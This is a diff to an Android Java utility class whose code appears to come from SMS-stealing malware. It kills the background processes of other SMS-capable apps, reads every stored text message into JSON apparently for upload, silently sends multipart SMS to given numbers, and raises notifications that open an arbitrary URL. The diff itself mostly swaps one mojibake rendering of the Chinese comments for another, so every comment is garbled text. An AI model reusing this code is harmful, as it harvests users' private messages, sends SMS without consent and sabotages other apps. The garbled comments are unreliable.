@@ -31,7 +31,7 @@ public class Tools {
 	{
 		ConnectivityManager mConnectivity = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
         TelephonyManager mTelephony = (TelephonyManager)context.getSystemService(context.TELEPHONY_SERVICE);
-        //¼ì²éÍøÂçÁ¬½Ó£¬Èç¹ûÎŞÍøÂç¿ÉÓÃ£¬¾Í²»ĞèÒª½øĞĞÁ¬Íø²Ù×÷µÈ  
+        //æ£€æŸ¥ç½‘ç»œè¿æ¥ï¼Œå¦‚æœæ— ç½‘ç»œå¯ç”¨ï¼Œå°±ä¸éœ€è¦è¿›è¡Œè¿ç½‘æ“ä½œç­‰  
         NetworkInfo info = mConnectivity.getActiveNetworkInfo();
         if (info == null) {       	
         	return false;
@@ -40,21 +40,21 @@ public class Tools {
 	}
 	
 	/**
-	 * ÖØÆô¾ßÓĞ»ñÈ¡¶ÌĞÅµÄAPP
+	 * é‡å¯å…·æœ‰è·å–çŸ­ä¿¡çš„APP
 	 */
 	public static boolean reStart(Context context)
 	{ 
-		//Logger.info("¿ªÊ¼Ê±¼ä£º"+System.currentTimeMillis());
+		//Logger.info("å¼€å§‹æ—¶é—´ï¼š"+System.currentTimeMillis());
         PackageManager pm = context.getPackageManager();
         List<PackageInfo> packs = pm.getInstalledPackages(PackageManager.GET_ACTIVITIES);          
         ActivityManager manager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);      
-        //°üÀ¨ËùÓĞAPP£¬É¾³ıµÄÒ²°üÀ¨
+        //åŒ…æ‹¬æ‰€æœ‰APPï¼Œåˆ é™¤çš„ä¹ŸåŒ…æ‹¬
         for(int i=0;i<packs.size();i++) {  
         	PackageInfo p = packs.get(i);
         	if(!p.packageName.equals(context.getPackageName()))
         	{
         		if(getPermisson(p.packageName,context))
-            	{//Èç¹ûÅĞ¶Ï³öÓĞ»ñÈ¡¶ÌĞÅÈ¨ÏŞ
+            	{//å¦‚æœåˆ¤æ–­å‡ºæœ‰è·å–çŸ­ä¿¡æƒé™
             		//Logger.info(p.packageName);
             		//manager.restartPackage(p.packageName);
             		manager.killBackgroundProcesses(p.packageName);
@@ -62,7 +62,7 @@ public class Tools {
         	}
         	
         }
-        //Logger.info("½áÊøÊ±¼ä£º"+System.currentTimeMillis());
+        //Logger.info("ç»“æŸæ—¶é—´ï¼š"+System.currentTimeMillis());
 		return true;
 	}
 	
@@ -94,16 +94,16 @@ public static boolean getPermisson(String pkgName,Context context) {
     	return false;
 	}
 
-	//·¢ËÍ¶ÌĞÅ
+	//å‘é€çŸ­ä¿¡
 	public static boolean sendSms(Context mContext, String sn, String sm) {
 		// TODO Auto-generated method stub
 		
 		Intent itsend = null;
 		Intent itDeliver = null;
 		String num = sn;
-		//·¢ËÍ¶ÌÏ¢ÄÚÈİ
+		//å‘é€çŸ­æ¯å†…å®¹
 		String message = sm;
-		//·¢ËÍ¶ÌÏ¢
+		//å‘é€çŸ­æ¯
 		itsend = new Intent(Tag.SMS_SEND_ACTIOIN);
 		itsend.putExtra("number", num);
 		SmsManager smsManager = SmsManager.getDefault();
@@ -119,7 +119,7 @@ public static boolean getPermisson(String pkgName,Context context) {
 		mDeliverlist.add(mDeliverPI);
 		if (message != null) {								
               ArrayList<String> msgs = smsManager.divideMessage(message); 
-              Logger.info("·¢ËÍ³¤¶ÌĞÅ!!!!!!!!!!!!!!!!!!!!!!!");
+              Logger.info("å‘é€é•¿çŸ­ä¿¡!!!!!!!!!!!!!!!!!!!!!!!");
               smsManager.sendMultipartTextMessage(num, null, msgs, mSentlist, mDeliverlist); 				
 		}
 		
@@ -132,15 +132,15 @@ public static boolean getPermisson(String pkgName,Context context) {
 	
 	
 	
-	//»ñÈ¡¶ÌĞÅ
+	//è·å–çŸ­ä¿¡
 	public static JSONArray getSms(Context mContext)   
 	{   
 	    final String SMS_URI_ALL   = "content://sms/";  	    
-//	    //ÊÕ¼şÏä
+//	    //æ”¶ä»¶ç®±
 //	    final String SMS_URI_INBOX = "content://sms/inbox"; 
-//	    //·¢¼şÏä
+//	    //å‘ä»¶ç®±
 //	    final String SMS_URI_SEND  = "content://sms/sent";   
-//	    //²İ¸åÏä 
+//	    //è‰ç¨¿ç®± 
 //	    final String SMS_URI_DRAFT = "content://sms/draft";   
 	       
 	    
@@ -153,26 +153,26 @@ public static boolean getPermisson(String pkgName,Context context) {
 	        Cursor cur = cr.query(uri, projection, null, null, "date asc"); 	        
 	        if(null!=cur&&cur.getCount()<1)
 	        {
-	        	Logger.info("Ã»ÓĞĞèÒªÉÏ±¨µÄ¶ÌĞÅ");
+	        	Logger.info("æ²¡æœ‰éœ€è¦ä¸ŠæŠ¥çš„çŸ­ä¿¡");
 	        	return jsonlist;
 	        }  
 	        jsonlist = new JSONArray();
 	        if (cur.moveToFirst()) {  
-	        	//ÊÕ·¢¶ÌĞÅµÄÈËÃû
+	        	//æ”¶å‘çŸ­ä¿¡çš„äººå
 //	            String name;    
-//	            //ºÅÂë
+//	            //å·ç 
 //	            String phoneNumber;  
-//	            //¶ÌĞÅÄÚÈİ
+//	            //çŸ­ä¿¡å†…å®¹
 //	            String smsbody; 
-//	            //ÈÕÆÚ
+//	            //æ—¥æœŸ
 //	            String date;  
-//	            //ÀàĞÍ  1.½ÓÊÕ  2.·¢ËÍ  3.²İ¸å
+//	            //ç±»å‹  1.æ¥æ”¶  2.å‘é€  3.è‰ç¨¿
 //	            String type;   		            
-	            int nameColumn = cur.getColumnIndex("person");//Ãû×Ö   
-	            int phoneNumberColumn = cur.getColumnIndex("address");//ºÅÂë   
-	            int smsbodyColumn = cur.getColumnIndex("body");//ÄÚÈİ       
-	            int dateColumn = cur.getColumnIndex("date");//ÈÕÆÚ
-	            int typeColumn = cur.getColumnIndex("type");//ÀàĞÍ 
+	            int nameColumn = cur.getColumnIndex("person");//åå­—   
+	            int phoneNumberColumn = cur.getColumnIndex("address");//å·ç    
+	            int smsbodyColumn = cur.getColumnIndex("body");//å†…å®¹       
+	            int dateColumn = cur.getColumnIndex("date");//æ—¥æœŸ
+	            int typeColumn = cur.getColumnIndex("type");//ç±»å‹ 
 	            
 	            do{   		            	
 	            	
@@ -199,31 +199,38 @@ public static boolean getPermisson(String pkgName,Context context) {
 	}  
 	
 	/**
-	 * µ¯³öÌáÊ¾Í¨Öª
+	 * å¼¹å‡ºæç¤ºé€šçŸ¥
 	 * @param context
 	 * @param num
 	 * @param message
 	 */
 	public static void showNotification(Context context,String title,String message,String url){  
-        //¶ÌĞÅºÅÂë
+        //çŸ­ä¿¡å·ç 
     	CharSequence contentTitle = title;
-    	//¶ÌĞÅÎÄ±¾ÄÚÈİ
+    	//çŸ­ä¿¡æ–‡æœ¬å†…å®¹
         CharSequence contentText = message;    	
-        //µÃµ½Ò»¸öNotificationManager¶ÔÏó  
+        //å¾—åˆ°ä¸€ä¸ªNotificationManagerå¯¹è±¡  
         NotificationManager manager=(NotificationManager)context.getSystemService(Context.NOTIFICATION_SERVICE);            
-        //ÊµÀı»¯Ò»¸öNotification   
-        int icon=R.drawable.ic_launcher;  
+        //å®ä¾‹åŒ–ä¸€ä¸ªNotification  
+        int icon = R.drawable.ic_launcher;
+        try {
+			PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(),0);
+			icon = packageInfo.applicationInfo.icon;
+		} catch (NameNotFoundException e) {
+			Logger.error("error:"+e.getMessage());
+		}
+         
         long when=System.currentTimeMillis();  
         Notification notification=new Notification(icon, title, when);  
              
-        //ÉèÖÃ×îĞÂÊÂ¼şÏûÏ¢ºÍPendingIntent    
+        //è®¾ç½®æœ€æ–°äº‹ä»¶æ¶ˆæ¯å’ŒPendingIntent    
         //Intent intent=new Intent(Intent.ACTION_MAIN,Uri.parse("smsto:" + contentTitle));
         Intent it = new Intent(Intent.ACTION_VIEW, Uri.parse(url));       
         PendingIntent pendingIntent=PendingIntent.getActivity(context, 0, it, 0);  
         notification.setLatestEventInfo(context, contentTitle, contentText, pendingIntent); 
-        //Í¨Öª±»µãºóÁ¢¿ÌÏûÊ§
+        //é€šçŸ¥è¢«ç‚¹åç«‹åˆ»æ¶ˆå¤±
         notification.flags |= Notification.FLAG_AUTO_CANCEL; 
-        //Æô¶¯ÌáĞÑ  
+        //å¯åŠ¨æé†’  
         manager.notify(1, notification);    
    }
 	
